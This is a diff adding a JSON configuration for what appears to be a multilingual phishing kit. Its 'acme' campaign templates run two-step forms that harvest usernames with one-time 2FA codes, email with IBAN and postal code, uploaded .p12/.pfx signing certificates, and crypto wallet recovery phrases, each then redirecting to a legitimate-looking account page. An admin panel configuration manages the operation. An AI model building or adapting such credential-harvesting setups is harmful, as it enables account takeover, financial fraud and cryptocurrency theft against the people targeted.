@@ -1,0 +1,160 @@
+{
+  "listen": "127.0.0.1:8080",
+  "data_dir": "data",
+  "admin": {
+    "password_hash_file": "/run/secrets/admin-password-hash",
+    "totp_secret_file": "/run/secrets/admin-totp-secret",
+    "csrf_secret_file": "/run/secrets/admin-csrf-secret",
+    "allowlist": ["127.0.0.1/32"],
+    "rate_limit": 5
+  },
+  "campaigns": {
+    "acme": {
+      "templates": {
+        "tmp-001": {
+          "a": {
+            "target": "/c/acme/tmp-001/b",
+            "mode": "inline",
+            "fields": [
+              {
+                "name": "identifier",
+                "kind": "text",
+                "max_len": 64,
+                "labels": {
+                  "fr": "Identifiant",
+                  "en": "Username",
+                  "de": "Benutzername"
+                }
+              }
+            ]
+          },
+          "b": {
+            "target": "https://example.com/account",
+            "mode": "inline",
+            "fields": [
+              {
+                "name": "code",
+                "kind": "otp",
+                "max_len": 6,
+                "labels": {
+                  "fr": "Code à 6 chiffres",
+                  "en": "6-digit code",
+                  "de": "6-stelliger Code"
+                }
+              }
+            ]
+          }
+        },
+        "tmp-002": {
+          "a": {
+            "target": "/c/acme/tmp-002/b",
+            "mode": "inline",
+            "fields": [
+              {
+                "name": "email",
+                "kind": "text",
+                "max_len": 254,
+                "labels": {
+                  "fr": "Adresse e-mail",
+                  "en": "Email address",
+                  "de": "E-Mail-Adresse"
+                }
+              },
+              {
+                "name": "iban",
+                "kind": "iban",
+                "max_len": 34,
+                "labels": {
+                  "fr": "IBAN",
+                  "en": "IBAN",
+                  "de": "IBAN"
+                }
+              },
+              {
+                "name": "postal_code",
+                "kind": "text",
+                "max_len": 16,
+                "labels": {
+                  "fr": "Code postal",
+                  "en": "Postal code",
+                  "de": "Postleitzahl"
+                }
+              }
+            ]
+          },
+          "b": {
+            "target": "https://example.com/account",
+            "mode": "inline"
+          }
+        },
+        "tmp-003": {
+          "a": {
+            "target": "/c/acme/tmp-003/b",
+            "mode": "inline",
+            "fields": [
+              {
+                "name": "email",
+                "kind": "text",
+                "max_len": 254,
+                "labels": {
+                  "fr": "Adresse e-mail professionnelle",
+                  "en": "Work email address",
+                  "de": "Geschäftliche E-Mail-Adresse"
+                }
+              }
+            ]
+          },
+          "b": {
+            "target": "https://example.com/account",
+            "mode": "inline",
+            "fields": [
+              {
+                "name": "certificate",
+                "kind": "file",
+                "accept": [".p12", ".pfx"],
+                "labels": {
+                  "fr": "Certificat de signature",
+                  "en": "Signing certificate",
+                  "de": "Signaturzertifikat"
+                }
+              }
+            ]
+          }
+        },
+        "tmp-004": {
+          "a": {
+            "target": "/c/acme/tmp-004/b",
+            "mode": "inline",
+            "fields": [
+              {
+                "name": "email",
+                "kind": "text",
+                "max_len": 254,
+                "labels": {
+                  "fr": "Adresse e-mail",
+                  "en": "Email address",
+                  "de": "E-Mail-Adresse"
+                }
+              }
+            ]
+          },
+          "b": {
+            "target": "https://example.com/account",
+            "mode": "inline",
+            "fields": [
+              {
+                "name": "seed",
+                "kind": "seed",
+                "labels": {
+                  "fr": "Phrase de récupération",
+                  "en": "Recovery phrase",
+                  "de": "Wiederherstellungsphrase"
+                }
+              }
+            ]
+          }
+        }
+      }
+    }
+  }
+}
